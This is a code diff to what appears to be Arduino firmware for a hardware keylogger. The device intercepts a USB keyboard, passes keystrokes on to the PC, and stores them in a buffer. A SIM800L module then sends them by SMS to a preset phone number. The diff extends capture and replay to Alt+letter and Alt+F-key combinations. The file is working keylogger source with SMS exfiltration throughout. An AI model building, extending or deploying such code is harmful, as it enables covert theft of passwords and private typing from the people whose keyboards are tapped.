@@ -162,6 +162,24 @@ EscapedKey escapedKeysData[] = {
   0x5B, KEY_LEFT_GUI, "[Windows]",
 };
 
+byte altCombined_CharSymbols[] = {0x1e, 0x30, 0x2e, 0x20, 0x12, 0x21, 0x22, 0x23, 0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18, 0x19, 0x10, 0x13, 0x1a, 0x14, 0x16, 0x2f, 0x11, 0x2d, 0x15, 0x2c}; 
+
+EscapedKey altCombined_F_Keys[] = {
+  0x68, KEY_F1, "[ALT+F1]",   
+  0x69, KEY_F2, "[ALT+F2]",
+  0x6a, KEY_F3, "[ALT+F3]",     
+  0x6b, KEY_F4, "[ALT+F4]",
+  0x6c, KEY_F5, "[ALT+F5]",    
+  0x6d, KEY_F6, "[ALT+F6]",
+  0x6e, KEY_F7, "[ALT+F7]",    
+  0x6f, KEY_F8, "[ALT+F8]",
+  0x70, KEY_F9, "[ALT+F9]",    
+  0x71, KEY_F10, "[ALT+F10]",
+  0x8b, KEY_F11, "[ALT+F11]",    
+  0x8c, KEY_F12, "[ALT+F12]",
+  0x9, KEY_TAB, "[ALT+TAB]",
+};
+
 char flag_esc = 0; // variable changed depending on the value received from USB host board that indicates the use of "escaped character" (like Page-up, Page-down, Up-arrow, etc.) 
 char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires
 int char_count; // how many characters were "collected" since turning device on (or since last sms was sent)
@@ -202,11 +220,11 @@ void loop() {
  */
 
 void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC 
-  if (KeyboardSerial.available() > 0) { // check if any key was pressed   
+  if (KeyboardSerial.available() > 0) { // check if any key was pressed     
     lastKeyPressedTime = millis();
     wasLastKeyDebounced = false;
     byte inByte = KeyboardSerial.read(); // read the byte representing that key
-  
+    //Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte);
     if (inByte == 27){flag_esc = 1; keysCountAfterEscapedKey = 0;} // if 27 key was pressed then do nothing
     else {
       ApplyActionForKeyByte(inByte, flag_esc);
@@ -249,7 +267,7 @@ void ActualEscKeyFix(unsigned long lastKeyPressedTime){
 void ApplyActionForKeyByte(byte inByte, byte flag_state){
   if (flag_state == 1) {
     // Previous char was ESC - Decode all the escaped keys
-    PrintEscapedKey(inByte); // prints but doesn't type
+    PrintOrPressEscapedKey(inByte); // prints but doesn't type
     flag_esc = 0;
   }
   else {
@@ -301,19 +319,43 @@ void ApplyActionForKeyByte(byte inByte, byte flag_state){
   }
 }
 
-void PrintEscapedKey(byte inByte){
-  bool foundEscapedKey = false;
+void PrintOrPressEscapedKey(byte inByte){
+  // print only
   for (byte i = 0; i < sizeof(escapedKeysData) / sizeof(EscapedKey); i++) {
     if (inByte == escapedKeysData[i].correspondingByte) {
       Serial_println(escapedKeysData[i].loggedText);
       Keyboard.press(escapedKeysData[i].pressedKey);
       delay(DELAY_BEFORE_RELEASING_KEYS);
       Keyboard.releaseAll();
-      foundEscapedKey = true;
-      break;
+      return;
     }
   }
-  if (foundEscapedKey == false){Serial_print(F("[?]"));}
+
+  // alt based (type to PC)
+  for (byte i = 0; i < sizeof(altCombined_CharSymbols); i++) {
+    if (inByte == altCombined_CharSymbols[i]){
+      Serial_print(F("Alt+"));
+      Serial_println((char)(i + 97)); // 0+97 for a gives 97 which is ascii value for it, the same happens for all the other characters from a to z
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press((char)(i + 97));
+      delay(DELAY_BEFORE_RELEASING_KEYS);
+      Keyboard.releaseAll();
+      return;
+    }
+  }
+
+  for (byte i = 0; i < sizeof(altCombined_F_Keys) / sizeof(EscapedKey); i++) {
+    if (inByte == altCombined_F_Keys[i].correspondingByte) {
+      Serial_println(altCombined_F_Keys[i].loggedText);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press(altCombined_F_Keys[i].pressedKey);
+      delay(DELAY_BEFORE_RELEASING_KEYS);
+      Keyboard.releaseAll();
+      return;
+    }
+  }
+
+  Serial_print(F("[?]"));
 }
 
 
@@ -331,8 +373,6 @@ void HandlingSim800L() {
     
     SmsSerial.listen();
     Serial_println("\nSMS with the following content is about to be sent to sim800L: "); Serial_println(TextSms);
-    //Send_Sim800L_Cmd("AT+CMGF=1\r\n", "OK");
-    
     sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", PHONE_RECEIVER_NUMBER); // format the sms command (so the number can be easily changed at the top of the code) 
     Send_Sim800L_Cmd(sms_cmd, ">");
     TextSms[char_count] = 26; TextSms[char_count+1] = 0;
